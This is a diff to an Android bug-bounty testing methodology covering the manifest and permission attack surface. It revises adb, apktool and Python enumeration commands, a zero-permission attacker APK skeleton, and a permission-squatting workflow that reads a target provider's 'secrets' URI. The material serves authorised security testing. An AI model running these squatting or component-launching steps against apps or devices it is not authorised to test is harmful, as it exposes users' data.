@@ -8,7 +8,7 @@
 | **Milestones** | M3, M4 |
 | **VRT ceiling** | Domain-native node is `broken_access_control.exposed_sensitive_android_intent` (**null — rated on what it exposes**). The realistic ceiling is P1 by chaining: `broken_authentication_and_session_management.authentication_bypass` (P1) when the self-granted permission opens a session-issuing surface, `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it opens a provider keyed by a user id, or `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it yields a live credential. Everything filed as a manifest attribute alone tops out at `mobile_security_misconfiguration.*` (P5). |
 | **Primary attacker model** | **AM-03** zero-permission local app. Secondary: AM-04 (local app holding one common permission), AM-08 (malicious third-party SDK inside the app's own manifest), AM-11 (physical unlocked, for the backup and `pm grant` items). |
-| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE, MASVS-STORAGE-2, MASVS-PRIVACY-1. MASTG-TEST-0355, -0254, -0262, -0216, -0364, -0365, -0366, -0285, -0286, -0235, -0315, -0252; MASTG-KNOW-0017, -0132, -0133, -0134; MASTG-TECH-0126, -0127, -0128, -0141, -0150, -0151, -0160, -0161, -0162, -0163; MASWE-0006, -0018, -0047, -0066. CWE-250, CWE-269, CWE-862, CWE-863, CWE-919, CWE-927, CWE-212, CWE-312, CWE-313. ATT&CK T1626, T1626.001, T1453, T1417, T1417.001, T1417.002, T1429, T1512, T1516, T1533, T1541, T1582, T1616, T1624.001, T1627.001, T1629.002, T1630.002, T1636.001–.005, T1642, T1643, T1644, T1430, T1661; mitigations M1006, M1011, M1012, M1013. CVE-2019-2200. |
+| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE, MASVS-STORAGE-2, MASVS-PRIVACY-1. MASTG-TEST-0355, -0254, -0262, -0216, -0364, -0365, -0366, -0285, -0286, -0235, -0226, -0340; MASTG-KNOW-0017, -0132, -0133, -0134; MASTG-TECH-0126, -0127, -0128, -0141, -0150, -0151, -0160, -0161, -0162, -0163; MASWE-0006, -0018, -0047, -0066. CWE-250, CWE-269, CWE-862, CWE-863, CWE-919, CWE-927, CWE-212, CWE-312, CWE-313. ATT&CK T1626, T1626.001, T1453, T1417, T1417.001, T1417.002, T1429, T1512, T1516, T1533, T1541, T1582, T1616, T1624.001, T1627.001, T1629.002, T1630.002, T1636.001–.005, T1642, T1643, T1644, T1430, T1661; mitigations M1006, M1011, M1012, M1013. CVE-2019-2200. |
 
 ## Why this domain pays
 
@@ -44,9 +44,9 @@ grep -oE '<(queries|activity-alias|path-permission|grant-uri-permission|uses-nat
 grep -oE 'android.permission.(BIND_DEVICE_ADMIN|BIND_ACCESSIBILITY_SERVICE|SYSTEM_ALERT_WINDOW|MANAGE_EXTERNAL_STORAGE|QUERY_ALL_PACKAGES|REQUEST_INSTALL_PACKAGES|USE_EXACT_ALARM|USE_FULL_SCREEN_INTENT|ACCESS_BACKGROUND_LOCATION|NEARBY_WIFI_DEVICES|CALL_PHONE|ANSWER_PHONE_CALLS)|android.permission.health\.[A-Z_]+|SMS_DELIVER|SECRET_CODE|USB_DEVICE_ATTACHED|USB_ACCESSORY_ATTACHED|NDEF_DISCOVERED|accountType|expo.modules.updates|CodePush' "$M" | sort | uniq -c
 ```
 
-Decision rule: a family applies when its probe line prints at least one row; D03-001..D03-007, D03-054, D03-055 and D03-076 always apply. Probe 2 = `0 / 0` → D03-008..D03-023 and D03-032 are n/a. Probe 3 = no exported/unknown rows and 0 call sites → D03-024..D03-031 and D03-033..D03-045 are n/a (D03-040 stays if `registerReceiver` appears in `$SRC`). Each attribute/element/permission absent from probe 4 → the item named for it is n/a. `oem-scope` absent → D03-066 and D03-NEW-C are n/a. The n/a note a model writes in coverage.csv, verbatim shape:
+Decision rule: a family applies when its probe line prints at least one row; D03-001..D03-007, D03-054, D03-055 and D03-076 always apply. Probe 2 = `0 / 0` → D03-008..D03-023 and D03-032 are n/a. Probe 3 = no exported/unknown rows and 0 call sites → D03-024..D03-031 and D03-033..D03-045 are n/a (D03-040 stays if `registerReceiver` appears in `$SRC`). Each attribute/element/permission absent from probe 4 → the item named for it is n/a. `oem-scope` absent → D03-066 and D03-079 are n/a. The n/a note a model writes in coverage.csv, verbatim shape:
 
-`D03-0NN | n/a | probe 2026-10-14: merged manifest ($M, N splits decoded) defines 0 and enforces 0 non-platform permission strings; attribute <name> absent; inventory/components.csv --all has 0 exported rows of type <type> — family not present on this build (versionCode V, targetSdk T)`
+`D03-0NN | n/a | probe <date>: merged manifest ($M, N splits decoded) defines 0 and enforces 0 non-platform permission strings; attribute <name> absent; inventory/components.csv --all has 0 exported rows of type <type> — family not present on this build (versionCode V, targetSdk T)`
 
 Never write n/a for a family on the strength of `grep exported="true"` alone (D03-003), and never for the whole domain.
 
@@ -65,6 +65,8 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 
 ## Items
 
+Every `How` below assumes the P2 layout (START.md §6), written once here: `M=$DEC/apktool/AndroidManifest.xml` (the merged, decoded manifest), `SRC=$DEC/jadx/sources`, `RES=$DEC/apktool/res` — `$DEC` is `$E/decompiled`. Every `adb shell am start` carries `-S -W` (force-stop, then wait): a launch answered with `Activity not started, its current task has been brought to the front` ran nothing and must be re-run (D03-006). Every value handed to `adb shell am …` is parsed twice — wrap the whole remote command in single quotes and use double quotes inside, never an unquoted `;`, `|`, `<`, `>`, `*`, `?`, `$` or space in a remote argument.
+
 ### D03-001 · Analyse the MERGED manifest, and attribute every entry to the module that injected it
 
 | | |
@@ -73,19 +75,21 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (enabler) |
 | **Attacker** | n/a |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0141 (Inspecting the Merged AndroidManifest), MASTG-TECH-0150 (Analyzing the AndroidManifest), MASTG-TOOL-0124 (aapt2) |
 
 - **Test:** The manifest that is enforced is the one inside the built APK, not `app/src/main/AndroidManifest.xml`. `AD_ID`, `QUERY_ALL_PACKAGES`, foreground-service types, the Photo Picker `ModuleDependencies` service and whole exported components arrive by AAR manifest merge. Reviewing source misses all of it.
 - **How:**
   ```bash
-  apktool d -f base.apk -o out/           # binary manifest -> XML
-  xmllint --format out/AndroidManifest.xml > merged.xml
-  jadx --no-src -d $DEC/jadx base.apk      # second opinion: out/resources/AndroidManifest.xml
+  # P2 already decoded the APK: $DEC/apktool/AndroidManifest.xml is the merged, decoded manifest ($M);
+  # jadx keeps its own copy at $DEC/jadx/resources/AndroidManifest.xml (second opinion)
+  xmllint --format "$M" > "$E/work/merged.xml" 2>/dev/null   # pretty copy, only if you want one; every item below reads "$M"
+  diff <(xmllint --format "$M") <(xmllint --format $DEC/jadx/resources/AndroidManifest.xml) | head   # the two decoders must agree
   aapt2 dump xmltree base.apk --file AndroidManifest.xml | head -80   # raw; exported="true" prints as 0xffffffff
   # if you have the source tree, attribute each entry:
   ./gradlew :app:processReleaseManifest
   grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt
-  diff <(xmllint --format app/src/main/AndroidManifest.xml) merged.xml | head -80
+  diff <(xmllint --format app/src/main/AndroidManifest.xml) <(xmllint --format "$M") | head -80
   ```
   For split APKs, decode **every** split (`base`, `config.*`, feature modules) — a component can be declared in a feature split only.
 - **Proof:** A side-by-side where the merged manifest contains a `<uses-permission>` or exported component absent from the source manifest, with the merger report line naming the responsible AAR.
@@ -100,14 +104,15 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (enabler; it is also the severity-honesty control) |
 | **Attacker** | n/a |
 | **Applies to** | all |
-| **Maps to** | MASTG-TEST-0315 ("Why minSdkVersion and not targetSdkVersion?"), MASTG-TEST-0252, MASTG-TECH-0117, MASTG-TECH-0150 |
+| **Requires** | — |
+| **Maps to** | MASTG-TEST-0285 / MASTG-TEST-0286 (the "Why minSdkVersion and not targetSdkVersion?" note lives in the user-CA-trust tests — verify on refresh), MASTG-TECH-0117, MASTG-TECH-0150 |
 
 - **Test:** `minSdkVersion` is the security floor; `targetSdkVersion` selects which platform defaults apply to *this* app. MASTG is explicit that using `minSdkVersion` "ensures the test accounts for the least secure environment in which the app can operate". A high target with a low min still ships every legacy behaviour to real users.
 - **How:**
   ```bash
   aapt2 dump badging base.apk | grep -E "^sdkVersion|^targetSdkVersion|^compileSdkVersion"
   apkanalyzer manifest print base.apk | grep -E 'minSdkVersion|targetSdkVersion'
-  apktool -s d -f base.apk -o out && grep -A3 sdkInfo out/apktool.yml
+  grep -A3 sdkInfo $DEC/apktool/apktool.yml
   adb shell getprop ro.build.version.sdk    # record PER LAB DEVICE, per finding
   ```
   Then write the matrix into the methodology section and repeat it in every finding's *Applies to*: `minSdk=24, targetSdk=35; demonstrated on API 35 (primary) and API 26 (low-end lane); not demonstrated on 24–25`.
@@ -123,16 +128,18 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (the *reached behaviour* is what gets filed, under `broken_access_control.exposed_sensitive_android_intent`) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; defaults are version-gated (see below) |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0160, -0161, -0162, -0163; MASWE-0018 ("Unintentionally Exported Components"); ATT&CK T1624.001 |
 
 - **Test:** The documented defaults are not uniform and are the most commonly mis-stated fact in Android testing: `<provider>` defaults to `true` at API ≤ 16 and `false` for API 17+ when `targetSdkVersion >= 17`; `<activity>` / `<activity-alias>` / `<service>` / `<receiver>` default to `false` with no intent filter and **`true` with at least one**. From targetSdk 31 an intent-filtered component without an explicit `android:exported` fails the build (`Manifest merger failed : Apps targeting Android 12 and higher are required to specify an explicit value for android:exported...`). Produce a table: component · type · effective exported · `android:permission` · intent-filter actions · scheme.
 - **How:**
   ```bash
-  python3 - <<'PY'
-  import re
-  x=open('merged.xml',encoding='utf-8').read()
-  for kind in ('activity','activity-alias','service','receiver','provider'):
-      for m in re.finditer(r'<%s\b[^>]*?(/>|>.*?</%s>)'%(kind,kind), x, re.S):
+  python3 - <<'PY' | tee components-table.txt
+  import re, os
+  x=open(os.path.expandvars('$DEC/apktool/AndroidManifest.xml'),encoding='utf-8').read()
+  # (?=[\s/>]) not \b: '<activity\b' also matches '<activity-alias' and the non-greedy body then swallows the alias
+  for kind in ('activity-alias','activity','service','receiver','provider'):
+      for m in re.finditer(r'<%s(?=[\s/>])[^>]*?(/>|>.*?</%s>)'%(kind,kind), x, re.S):
           b=m.group(0); head=b.split('>')[0]
           name=re.search(r'android:name="([^"]+)"',head)
           exp=re.search(r'android:exported="(true|false)"',head)
@@ -143,10 +150,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   # xmlstarlet alternative, one query per type:
   xmlstarlet sel -t -m "//activity | //activity-alias" -v "name()" -o " " -v "@android:name" \
     -o " exported=" -v "@android:exported" -o " perm=" -v "@android:permission" \
-    -o " filters=" -v "count(intent-filter)" -n merged.xml
+    -o " filters=" -v "count(intent-filter)" -n "$M"
+  # the inventory omits exported=false components unless --all is passed; non-exported components are D03-008/D07 targets once a guard falls
+  python3 scripts/inventory.py --all
+  echo "manifest: $(grep -oE '<(activity|activity-alias|service|receiver|provider)[[:space:]/>]' "$M" | wc -l)  table: $(wc -l < components-table.txt)  csv: $(($(wc -l < inventory/components.csv)-1))"
+  # the three numbers must agree before any Ruled-out sentence is written; the fourth (live) count comes from D03-004
   ```
-- **Proof:** The table itself, with every row's exported verdict derived from targetSdk rather than from the literal attribute, cross-confirmed against D03-004.
-- **Escalation:** Every `exported=true perm=-` and `IMPLICIT-EXPORT` row is a test case in D04 (activities), D05 (receivers), D06 (services), D07 (providers).
+- **Proof:** The table itself, with every row's exported verdict derived from targetSdk rather than from the literal attribute, cross-confirmed against D03-004; and the count line (manifest / table / csv `--all`) printed with the three numbers equal.
+- **Escalation:** Dynamic owner: D01-035 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. Every `exported=true perm=-` and `IMPLICIT-EXPORT` row is a test case in D04 (activities), D05 (receivers), D06 (services), D07 (providers).
 - **Ruled out when:** Every component either has no `<intent-filter>` and no `android:exported="true"`, or carries `android:exported="false"` explicitly, **and** D03-004 confirms none of them appears in the live resolver tables. Asserting "no exported components" from a grep for `exported="true"` on a `targetSdk < 31` app is a false negative that kills the engagement, not a true negative.
 
 ### D03-004 · Reconcile the manifest against the live PackageManager resolver tables
@@ -157,6 +168,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (enabler) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0160/-0161/-0162/-0163, MASTG-TOOL-0004 (adb); drozer `app.package.attacksurface` |
 
 - **Test:** The manifest and the enforced state diverge when a component is enabled or disabled at runtime with `PackageManager.setComponentEnabledSetting`, when an OEM overlay changes it, or when a split you did not decode declares it. The device is the ground truth for reachability; the manifest is the ground truth for intent.
@@ -166,6 +178,10 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb shell dumpsys package $PKG | awk '/^Receiver Resolver Table:/{s=1} /^Service Resolver Table:/{s=0} s'
   adb shell dumpsys package $PKG | awk '/^Service Resolver Table:/{s=1} /^Domain verification status:/{s=0} s'
   adb shell dumpsys package $PKG | grep -i "Provider{"
+  # the live count per resolver block (activities/receivers/services) and providers — the fourth number for D03-003's count line
+  adb shell dumpsys package $PKG > dumpsys-pkg.txt
+  for blk in 'Activity Resolver Table' 'Receiver Resolver Table' 'Service Resolver Table'; do printf '%s: ' "$blk"; awk -v b="$blk" '$0 ~ "^"b":"{s=1;next} /Resolver Table:|Domain verification status:/{s=0} s' dumpsys-pkg.txt | grep -oE "$PKG/[A-Za-z0-9_.\$]+" | sort -u | wc -l; done
+  printf 'providers: '; grep -c 'Provider{' dumpsys-pkg.txt
   adb shell cmd package query-activities --components -p $PKG -a android.intent.action.MAIN
   # drozer, from an ordinary third-party UID (this is the view that matters):
   adb forward tcp:31415 tcp:31415 && drozer console connect
@@ -174,9 +190,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   #   run app.provider.info -a com.target.app
   ```
   MASTG-TECH-0160 warns verbatim that these commands "do not replace manifest inspection and do not enumerate every activity declared by the package or every associated permission" — use both halves.
-- **Proof:** A component present in a resolver table but absent from your table from D03-003 (enabled at runtime), or vice versa. Either divergence must be resolved before you declare the surface closed.
+- **Proof:** The four counts (manifest, table, csv `--all`, live) printed on one line, and any component present in a resolver table but absent from your table from D03-003 (enabled at runtime), or vice versa. Either divergence must be resolved before you declare the surface closed.
 - **Escalation:** Newly discovered components go straight into D04–D07.
-- **Ruled out when:** The resolver-table set and the manifest-derived set are identical after normalising alias names, and `grep -rn 'setComponentEnabledSetting' sources/` returns nothing. Then no runtime component flipping exists.
+- **Ruled out when:** The resolver-table set and the manifest-derived set are identical after normalising alias names, and `grep -rn 'setComponentEnabledSetting' $SRC/` returns nothing. Then no runtime component flipping exists.
 
 ### D03-005 · Read the permission model from PackageManager, not from the manifest, and decode the numeric protectionLevel
 
@@ -186,6 +202,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; definer-wins resolution is PackageManager behaviour, not a targetSdk gate |
+| **Requires** | — |
 | **Maps to** | `android.content.pm.PermissionInfo` constants; `getProtection()` / `getProtectionFlags()`; MASTG-KNOW-0017 |
 
 - **Test:** The manifest string and the *enforced* level diverge — another app defined the name first, an OEM overrode it, or the platform normalised it. Read the resolved level from the device and decode the flag bits: the base level is the low nibble, the modifiers are bits above it.
@@ -195,9 +212,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb shell dumpsys package $PKG | sed -n '/declared permissions/,/requested permissions/p'
   adb shell dumpsys package | grep -A3 'Permission \[com.target.permission.X\]'
   ```
-  Decode against `PermissionInfo`: base `PROTECTION_NORMAL`=0, `PROTECTION_DANGEROUS`=1, `PROTECTION_SIGNATURE`=2, `PROTECTION_SIGNATURE_OR_SYSTEM`=3 (deprecated), `PROTECTION_INTERNAL`=4. Flags: `PRIVILEGED`=0x10 (same bit as the old `SYSTEM`), `DEVELOPMENT`=0x20, `APPOP`=0x40, `PRE23`=0x80, `INSTALLER`=0x100, `VERIFIER`=0x200, `PREINSTALLED`=0x400, `SETUP`=0x800, `INSTANT`=0x1000, `RUNTIME_ONLY`=0x2000, `ROLE`=0x4000, `KNOWN_SIGNER`=0x8000.
+  Decode against `PermissionInfo`: base `PROTECTION_NORMAL`=0, `PROTECTION_DANGEROUS`=1, `PROTECTION_SIGNATURE`=2, `PROTECTION_SIGNATURE_OR_SYSTEM`=3 (deprecated), `PROTECTION_INTERNAL`=4. Flags: `PRIVILEGED`=0x10 (same bit as the old `SYSTEM`), `DEVELOPMENT`=0x20, `APPOP`=0x40, `PRE23`=0x80, `INSTALLER`=0x100, `VERIFIER`=0x200, `PREINSTALLED`=0x400, `SETUP`=0x800, `INSTANT`=0x1000, `RUNTIME_ONLY`=0x2000, `OEM`=0x4000, `VENDOR_PRIVILEGED`=0x8000, `SYSTEM_TEXT_CLASSIFIER`=0x10000, `WELLBEING`=0x20000, `DOCUMENTER`=0x40000, `CONFIGURATOR`=0x80000, `INCIDENT_REPORT_APPROVER`=0x100000, `APP_PREDICTOR`=0x200000, `COMPANION`=0x800000, `RETAIL_DEMO`=0x1000000, `RECENTS`=0x2000000, `ROLE`=0x4000000, `KNOWN_SIGNER`=0x8000000, `MODULE`=0x10000000. `pm list permissions -f` already prints the decoded string (`protectionLevel:signature|privileged|role`); decode numerically only for `dumpsys package` `prot=0x...` lines.
 - **Proof:** `pm list permissions -f` prints, per permission, the **current definer** (`package:`) and `protectionLevel:`. A paste where the APK manifest says `signature` and `pm list permissions -f` says `normal` is, on its own, a complete finding. A permission string used in the manifest that `pm list permissions -f` does not print at all proves it is an orphan (-> D03-008).
-- **Escalation:** This is the confirmation step for D03-008 through D03-015; without it a squatting claim is theoretical.
+- **Escalation:** Dynamic owner: D01-039 (D07-014 / D06-026 per component) runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. This is the confirmation step for D03-008 through D03-015; without it a squatting claim is theoretical.
 - **Ruled out when:** Every permission string the app enforces resolves on device to `package:<the target's own package>` with a `protectionLevel` of `signature`, `signature|privileged` or `signature|knownSigner`, matching the manifest byte for byte. Then the declared model is the enforced model.
 
 ### D03-006 · Prove every reachability claim from a separate, zero-permission attacker APK — never from `adb shell am` alone
@@ -208,31 +225,41 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (evidence discipline) |
 | **Attacker** | AM-03 |
 | **Applies to** | all IPC and permission findings |
+| **Requires** | — |
 | **Maps to** | YesWeHack Android recon guidance ("for these attacks to not be considered 'self-exploitation' ... you need to provide a PoC from a third-party application that you control yourself"); Intigriti triage standard ("the simplest possible demonstration that proves the vulnerability's exploitability and impact beyond reasonable doubt") |
 
-- **Test:** `adb shell am` runs as UID 2000 (`shell`), which holds permissions no ordinary app has, and drozer's agent likewise. A finding demonstrated only that way is self-exploitation and closes. Re-implement in a minimal APK whose manifest declares **no** `<uses-permission>` at all, signed with a key unrelated to the target's.
+- **Test:** `adb shell am` runs as UID 2000 (`shell`), which holds permissions no ordinary app has, and drozer's agent likewise. On a rooted emulator or a userdebug build `adb shell` is **uid 0** — it reaches `exported="false"` components and non-exported providers, so shell reachability on such a device is a root artefact, not evidence: record `adb shell id` at the top of every transcript and treat uid=0 transcripts as lab-only. A finding demonstrated only that way is self-exploitation and closes. Use the repository probe `attacker-app/` (zero `<uses-permission>`, a `<queries>` entry for the target, signed with a key unrelated to the target's): its `start` step sends an explicit component or implicit action with typed extras and `--ez forresult true` dumps the result Intent; `broadcast` sends explicit/implicit broadcasts with or without an action; `bind` binds a service and sweeps transaction codes; `provider` runs the verb matrix behind a positive control; `deeplink` fires a BROWSABLE VIEW; `enumerate` lists what an unprivileged UID can see. Build your own minimal APK only for a shape the probe does not cover, and keep the skeleton below.
 - **How:** Attacker manifest skeleton, plus the UID/context proof line:
   ```xml
   <manifest package="com.poc.attacker" xmlns:android="http://schemas.android.com/apk/res/android">
     <!-- deliberately NO uses-permission elements -->
+    <!-- needs no permission or prompt; without it a targetSdk>=30 probe cannot see the target (D03-046) and any negative is invalid -->
+    <queries><package android:name="com.target.app"/></queries>
     <application android:label="Battery Helper">
       <activity android:name=".ExploitActivity" android:exported="true"/>
     </application>
   </manifest>
   ```
   ```java
-  Log.i("POC", "PID:" + Process.myPid() + " UID:" + Process.myUid());
+  String ctx = "?";
+  try (java.io.BufferedReader r = new java.io.BufferedReader(new java.io.FileReader("/proc/self/attr/current"))) { ctx = r.readLine(); } catch (Exception ignored) {}
+  Log.i("POC", "uid=" + Process.myUid() + " ctx=" + ctx);
   ```
   ```bash
+  adb shell id                                   # uid=2000(shell) on the device used for any shell-side control; uid=0 means rooted/userdebug: lab-only
   adb install attacker.apk
   adb shell dumpsys package com.poc.attacker | sed -n '/requested permissions/,/install permissions/p'   # must be empty
-  adb shell am start -n com.poc.attacker/.ExploitActivity
+  # -S force-stops the target first, -W waits for the launch. Without -S a live task answers
+  # "Warning: Activity not started, its current task has been brought to the front" and onCreate never runs:
+  # treat that stderr line as a FAILED delivery and re-run.
+  adb shell am start -S -W -n com.poc.attacker/.ExploitActivity
   adb logcat -s POC
-  # expect: uid=10222(u0_a222)  context=u:r:untrusted_app:s0:c222,c256,c512,c768
+  adb shell ps -Z | grep com.poc.attacker        # u:r:untrusted_app:s0:cNNN,... — the context line the Proof requires
   ```
-- **Proof:** `dumpsys package com.poc.attacker` showing an empty requested-permission set, the logcat line proving `untrusted_app` SELinux context, and the target's side effect occurring. State in the report body, in words, that the PoC app requests no permissions — H1 #185862 (Twitter location, $560) turned on exactly that sentence.
+  The probe follows the same rule: every `am start` that launches it carries `-S` (or a per-fire `-a probe.fire.$N` action) so no two fires collapse into one delivery.
+- **Proof:** `dumpsys package com.poc.attacker` showing an empty requested-permission set, the `ps -Z` or `/proc/self/attr/current` line showing `untrusted_app` for the PoC process, `adb shell id` showing uid=2000 (not 0) on the device used for any shell-side control, and the target's side effect occurring. State in the report body, in words, that the PoC app requests no permissions — H1 #185862 (Twitter location, $560) turned on exactly that sentence.
 - **Escalation:** Raises an otherwise-Medium information disclosure to High/Critical, because the install prompt shows the victim nothing and there is no consent step to blame.
-- **Ruled out when:** The PoC app, holding no permissions, receives `java.lang.SecurityException: Permission Denial: ... requires <perm>` or `... not exported from uid`. Capture that exception — it is your true negative, and it is stronger evidence than "I did not find anything".
+- **Ruled out when:** The PoC app, holding no permissions, receives `java.lang.SecurityException: Permission Denial: ... requires <perm>` or `... not exported from uid`. Capture that exception — it is your true negative, and it is stronger evidence than "I did not find anything". A negative produced by a probe built with targetSdk ≥ 30 and no `<queries>` entry for the target is void (package visibility, not the target's guard, produced it); a negative produced from a uid-0 shell is void in the other direction.
 
 ### D03-007 · Count your sweep results — the shell-loop ban applied to manifest and permission enumeration
 
@@ -242,9 +269,10 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | none (false-positive / false-negative discipline) |
 | **Attacker** | n/a |
 | **Applies to** | every automated manifest, permission or component sweep, including agent-driven ones |
+| **Requires** | — |
 | **Maps to** | Claude-BugHunter `bb-methodology` PART 4 "Shell-Loop Ban"; the Body-Diff Rule, restated for IPC below |
 
-- **Test:** zsh array expansion fails **silently**. A loop such as `for c in "${components[@]}"; do adb shell am start -n "$PKG/$c"; done` can produce zero iterations, with output that looks complete, when the array was never populated by the previous command. The corpus records ~50 probes lost to exactly this. Anything iterating more than five items goes to Python with per-iteration `try/except` and explicit logging — and you **count the results**.
+- **Test:** zsh array expansion fails **silently**. A loop such as `for c in "${components[@]}"; do adb shell am start -S -W -n "$PKG/$c"; done` can produce zero iterations, with output that looks complete, when the array was never populated by the previous command. The corpus records ~50 probes lost to exactly this. Anything iterating more than five items goes to Python with per-iteration `try/except` and explicit logging — and you **count the results**.
 - **How:**
   ```python
   import subprocess, json
@@ -253,8 +281,10 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ok = 0
   for c in comps:
       try:
-          r = subprocess.run(['adb','shell','am','start','-n',f'{PKG}/{c}'],
+          r = subprocess.run(['adb','shell','am','start','-S','-W','-n',f'{PKG}/{c}'],
                              capture_output=True, text=True, timeout=20)
+          if 'brought to the front' in r.stderr or 'brought to the front' in r.stdout:
+              raise RuntimeError('no-op launch: task already alive, onCreate did not run')   # D03-006
           denied = 'SecurityException' in r.stderr or 'Permission Denial' in r.stderr
           print(json.dumps({'component': c, 'denied': denied, 'out': r.stdout.strip()[:200]}))
           ok += 1
@@ -274,22 +304,31 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) escalating to `broken_authentication_and_session_management.authentication_bypass` (P1) or `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | **all versions.** No install-order race, no user interaction, not fixed by any platform change. Reachable on current Android whenever the defining package is simply absent. |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions` — "Orphaned permissions": *privileged app uses undefined permission to protect a component; malicious app defines that orphaned permission first; malicious app gains access to protected component*. Android Lint check `CustomPermissionTypo`. MobSF `exported_protected_permission_not_defined`. Google Mobile VRP lists **"orphaned permissions"** by name in "Additional vulnerability types in scope". MASWE-0018, CWE-862/CWE-863 |
 
 - **Test:** The highest-yield item in the domain. If the target protects a component with `android:permission="com.target.X"` but ships no matching `<permission>` element — typo, stale manifest, wrong module in the build, or a permission defined only by a sibling app the victim never installed — then `X` does not exist. An attacker defines it and is granted it immediately.
 - **How:**
   ```bash
   # every permission string USED to protect something
-  grep -oE 'android:(permission|readPermission|writePermission)="[^"]+"' merged.xml \
+  grep -oE 'android:(permission|readPermission|writePermission)="[^"]+"' "$M" \
     | cut -d'"' -f2 | sort -u > used.txt
   # every permission string DEFINED
-  grep -oE '<permission[^>]+android:name="[^"]+"' merged.xml \
+  grep -oE '<permission[^>]+android:name="[^"]+"' "$M" \
     | grep -oE 'android:name="[^"]+"' | cut -d'"' -f2 | sort -u > defined.txt
-  comm -23 used.txt defined.txt | grep -v '^android\.permission\.'   # orphan candidates
   # also cover <path-permission> and the <application>-level attribute
-  grep -oE '<path-permission[^>]*android:(read|write)?[Pp]ermission="[^"]+"' merged.xml
-  # confirm on-device that PackageManager does not know the string
-  adb shell pm list permissions -f | grep -c 'com.target.permission.ORPHAN'   # expect 0
+  grep -oE '<path-permission[^>]*android:(read|write)?[Pp]ermission="[^"]+"' "$M" | grep -oE '[Pp]ermission="[^"]+"' | cut -d'"' -f2 >> used.txt
+  # guard strings that live in CODE — the manifest diff misses all of these (registerReceiver broadcastPermission,
+  # sendBroadcast receiverPermission, check/enforce*Permission literals)
+  grep -rhoE '(registerReceiver|sendBroadcast|sendOrderedBroadcast|enforce(Calling|CallingOrSelf)?Permission|check(Calling|CallingOrSelf|Self)?Permission|checkPermission|setPermission)\b[^;]{0,200}"[A-Za-z0-9_]+(\.[A-Za-z0-9_]+)*\.permission\.[A-Za-z0-9_]+"' $SRC \
+    | grep -oE '"[^"]+\.permission\.[A-Za-z0-9_]+"' | tr -d '"' | sort -u > used-code.txt
+  sort -u used.txt used-code.txt -o used.txt
+  comm -23 used.txt defined.txt | grep -v '^android\.permission\.' > orphan-candidates.txt   # orphan candidates (manifest + code)
+  # resolve every survivor LIVE: a string defined by a preinstalled package at signature level is a sibling-definer,
+  # not an orphan — record the definer and its level next to each candidate
+  adb shell pm list permissions -f > pm-perms.txt
+  while read -r s; do printf '%s -> ' "$s"; grep -A3 "permission:$s\$" pm-perms.txt | grep -E 'package:|protectionLevel:' | tr '\n' ' '; echo; done < orphan-candidates.txt
+  echo "candidates: $(wc -l < orphan-candidates.txt)"   # count it (D03-007); an unresolved candidate is the squat target below
   ```
   Then the squatter APK:
   ```xml
@@ -301,9 +340,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb shell dumpsys package com.poc.attacker | grep -A3 'install permissions'
   adb shell content query --uri content://com.target.provider/secrets   # or am start / am startservice
   ```
-- **Proof:** Three lines together: (1) `pm list permissions -f` yields **no** entry for the string before you install the squatter; (2) after install, `dumpsys package com.poc.attacker` shows it under `install permissions:` with `granted=true` and **no user prompt was shown**; (3) the protected component returns data or performs its side effect where it previously threw `SecurityException`.
+- **Proof:** Three lines together — and first say where the string came from: (0) the string appears in `used.txt` from a manifest attribute or from a code literal (`used-code.txt`), quoted with its file:line; (1) `pm list permissions -f` yields **no** entry for the string before you install the squatter; (2) after install, `dumpsys package com.poc.attacker` shows it under `install permissions:` with `granted=true` and **no user prompt was shown**; (3) the protected component returns data or performs its side effect where it previously threw `SecurityException`.
 - **Escalation:** -> D07 (provider read), D06 (bound-service call), D05 (broadcast injection). If the reached component issues, refreshes or returns a session token, the chain terminates in `broken_authentication_and_session_management.authentication_bypass` (P1). File the orphan as its own primitive first, then the consumer (see D03-076).
-- **Ruled out when:** `comm -23 used.txt defined.txt` is empty after removing platform `android.permission.*` names, **and** `adb shell pm list permissions -f` prints every remaining string with `package:` equal to the target or to a package that ships in the same install unit and cannot be uninstalled independently. Run the diff across the whole vendor app suite, not one APK — the definer is frequently a sibling.
